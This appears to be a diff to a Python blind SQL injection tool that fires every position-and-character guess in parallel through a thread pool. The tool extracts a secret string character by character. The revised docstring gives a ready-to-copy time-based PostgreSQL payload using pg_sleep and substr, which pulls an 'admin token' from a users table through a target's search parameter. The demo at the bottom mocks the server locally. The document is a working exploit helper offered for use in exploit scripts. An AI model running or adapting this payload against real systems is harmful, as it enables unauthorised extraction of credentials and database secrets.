@@ -2,28 +2,35 @@
 """
 Blind SQLi extractor with parallel worker threads.
 
-Extracts a string of known length by firing ALL (position, character) combinations
-simultaneously via a thread pool, then collecting whichever character returned True
-at each position.
+A blind SQLi leaks one character per request. Pulling a long value one request
+at a time is slow, so this fires every (position, character) guess at once
+through a thread pool and keeps whichever guess comes back true at each position.
 
-This is significantly faster than sequential testing — a 64-char string against a
-94-char charset (a-zA-Z0-9 + punctuation) fires 6016 tasks total, but only max_workers run at once.
+How to use (copy extract_string_blind into your exploit script):
 
-Usage (copy extract_string_blind into your exploit script):
-    import requests, time
+You only write ONE function - is_correct_char(index, char) - that returns True
+when `char` is the correct character at position `index` (1-based). Pass it to
+extract_string_blind() and it pulls the whole string for you. Everything
+target-specific (session, URL, the SQLi payload) goes inside that one function.
 
-    session = requests.Session()
+Example - time-based blind SQLi on PostgreSQL:
 
-    def my_check(index: int, char: str) -> bool:
-        # Replace this with your actual blind SQLi logic.
-        # Return True if char is correct at position index (1-based).
-        sqli = f"(SELECT CASE WHEN (substr((SELECT secret FROM tbl LIMIT 1),{index},1)=$${char}$$) THEN pg_sleep(3) ELSE NULL END)"
-        t0 = time.time()
-        session.post(TARGET + "/api/" + sqli, data={"apiKey": apikey})
-        return time.time() - t0 >= 3   # True = time delay observed = correct char
+    def is_correct_char(index: int, char: str) -> bool:
+        # Asks the DB: "is character <index> of the secret == <char>?
+        # If yes, sleep 3s." A slow response then means the guess was right.
+        # $$...$$ is Postgres dollar-quoting - it drops <char> in safely even
+        # when <char> is a quote or other special character.
+        payload = (
+            "1 AND (SELECT CASE WHEN "
+            f"substr((SELECT secret FROM users LIMIT 1), {index}, 1) = $${char}$$ "
+            "THEN pg_sleep(3) ELSE pg_sleep(0) END)"
+        )
+        start = time.time()
+        session.get(TARGET + "/search", params={"id": payload})
+        return time.time() - start >= 3   # delayed response => correct char
 
-    result = extract_string_blind(my_check, length=64, label="admin token")
-    print(f"Extracted: {result}")
+    secret = extract_string_blind(is_correct_char, length=32, label="admin token")
+    print(secret)
 """
 
 import concurrent.futures
@@ -32,7 +39,7 @@ import sys
 import time
 
 # ==============================================================================
-# PARALLEL BLIND EXTRACTOR
+# PARALLEL BLIND EXTRACTOR (copy this section to your main script)
 # ==============================================================================
 
 def extract_string_blind(
@@ -96,7 +103,7 @@ if __name__ == "__main__":
     SECRET  = "aB3$xK9!"
     CHARSET = string.ascii_letters + string.digits + string.punctuation
 
-    def demo_check(index: int, char: str) -> bool:
+    def is_correct_char(index: int, char: str) -> bool:
         # Mock a time-based blind SQLi: every request carries network latency,
         # and a correct char triggers the server-side sleep (the signal).
         # index is 1-based (position 1 = first char), matching SQL's substr().
@@ -116,7 +123,7 @@ if __name__ == "__main__":
         for char in CHARSET:
             # show the brute force in action: confirmed prefix + the char being tried
             print(f"\r  [*] Extracting without helper: {''.join(chars)}{char}", end="", flush=True)
-            if demo_check(index, char):
+            if is_correct_char(index, char):
                 chars.append(char)
                 break
     seq_result = "".join(chars)
@@ -128,7 +135,7 @@ if __name__ == "__main__":
 # With the helper: every (index, char) request fired across the thread pool.
 # ==============================================================================
     t0 = time.time()
-    par_result = extract_string_blind(demo_check, length=len(SECRET), charset=CHARSET, label="with helper")
+    par_result = extract_string_blind(is_correct_char, length=len(SECRET), charset=CHARSET, label="with helper")
     par_time   = time.time() - t0
     print(f"  [+] With helper (parallel request fired across the thread pool): {par_time:5.1f}s  ->  {par_result}")
 
